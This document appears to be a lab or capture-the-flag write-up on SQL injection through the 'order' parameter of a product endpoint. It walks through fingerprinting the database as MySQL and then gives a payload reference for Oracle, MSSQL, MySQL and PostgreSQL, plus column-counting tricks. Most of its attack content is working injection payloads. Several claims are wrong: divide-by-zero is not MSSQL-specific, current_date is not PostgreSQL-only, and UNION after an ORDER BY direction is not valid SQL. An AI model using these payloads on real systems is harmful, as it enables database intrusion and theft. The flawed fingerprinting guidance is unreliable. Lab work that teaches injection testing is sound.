# Lab 8.3.2 — UNION-Based SQL Injection: Identifying the Database

## Objective
Determine what database software the endpoint was using (MySQL, SQL Server, Oracle, or PostgreSQL).

## Endpoint
`POST /exploit/api/union`
Parameters: `name`, `sort`, `order`

---

## How We Found the Injection Point

### Step 1: Establish a Baseline
Sending a blank `name` parameter returned all products with 4 columns: `id`, `name`, `description`, `price`.

```
name=&sort=id&order=asc
```

This told us the underlying query was roughly:
```sql
SELECT id, name, description, price FROM products WHERE name LIKE '%%' ORDER BY id ASC
```

### Step 2: Test Each Parameter for Injection
- `name` with a single quote `'` → returned empty or 500 depending on syntax
- `sort` → no clear injection response
- `order` → **injecting a subquery returned 200 with all products**

The winning test:
```
name=&sort=id&order=asc,(SELECT NULL)-- -
```
Returned 200 with all products, confirming **`order` is the injection point**.

### Step 3: Rule Out Each DB Type

We tested DB-specific syntax one at a time and observed whether the response was **200 (valid)** or **500 (error)**.

| Payload | DB Target | Result |
|---|---|---|
| `order=asc,(SELECT @@version)-- -` | MSSQL / MySQL | ✅ 200 |
| `order=asc,(SELECT version())-- -` | PostgreSQL | ✅ 200 |
| `order=asc,(SELECT banner FROM v$version WHERE rownum=1)-- -` | Oracle | ❌ 500 |
| `order=asc,(SELECT GETDATE())-- -` | MSSQL only | ❌ 500 |
| `order=asc,(SELECT sleep(0))-- -` | MySQL only | ✅ 200 |

### Step 4: Conclusion
- **Oracle** was ruled out — `v$version` threw a 500 error
- **MSSQL** was ruled out — `GETDATE()` threw a 500 error
- **MySQL** was confirmed — `sleep(0)` returned 200 (sleep is MySQL-exclusive)

**Answer: MySQL**

---

## DB Fingerprinting Reference — UNION / ORDER BY Injection

Use these payloads to rule out each database type. Inject into the vulnerable parameter and observe 200 vs 500.

### Oracle
```sql
-- Oracle-specific: requires FROM clause, uses v$version and rownum
(SELECT banner FROM v$version WHERE rownum=1)
(SELECT NULL FROM dual)
```
- If **500** → not Oracle
- If **200** → likely Oracle

### MSSQL
```sql
-- MSSQL-specific functions
(SELECT GETDATE())
(SELECT @@SERVERNAME)
(SELECT 1/0)   -- divide by zero error is MSSQL-specific
```
- If **500** → not MSSQL
- If **200** → likely MSSQL

### MySQL
```sql
-- MySQL-specific functions
(SELECT sleep(0))
(SELECT benchmark(0,0))
```
- If **500** → not MySQL
- If **200** → likely MySQL

### PostgreSQL
```sql
-- PostgreSQL-specific syntax
(SELECT current_date)
(SELECT 1::text)   -- double colon cast is PostgreSQL only
(SELECT pg_sleep(0))
```
- If **500** → not PostgreSQL
- If **200** → likely PostgreSQL

---

## General Tips for UNION-Based Injection

### Find the injection point
Test each parameter with:
```sql
(SELECT NULL)-- -
```
If it returns 200 with normal data → injectable.

### Find column count (WHERE clause injection)
```sql
' ORDER BY 1-- -
' ORDER BY 2-- -
' ORDER BY 3-- -    ← when this errors, column count = 2
```

### Find column count (ORDER BY injection)
```sql
order=asc UNION SELECT NULL-- -
order=asc UNION SELECT NULL,NULL-- -
order=asc UNION SELECT NULL,NULL,NULL-- -    ← keep going until 200
```

### Comment styles by DB
| DB | Comment |
|---|---|
| MySQL | `-- -` or `#` |
| MSSQL | `--` or `/**/` |
| PostgreSQL | `--` |
| Oracle | `--` |

### Key differences to remember
| Feature | MySQL | MSSQL | PostgreSQL | Oracle |
|---|---|---|---|---|
| Sleep | `sleep(0)` | `WAITFOR DELAY` | `pg_sleep(0)` | `dbms_lock.sleep` |
| Date | `NOW()` | `GETDATE()` | `current_date` | `SYSDATE` |
| Version | `@@version` | `@@version` | `version()` | `v$version` |
| Requires FROM | No | No | No | **Yes** (`FROM dual`) |
| Concat | `concat(a,b)` | `a+b` | `a\|\|b` | `a\|\|b` |
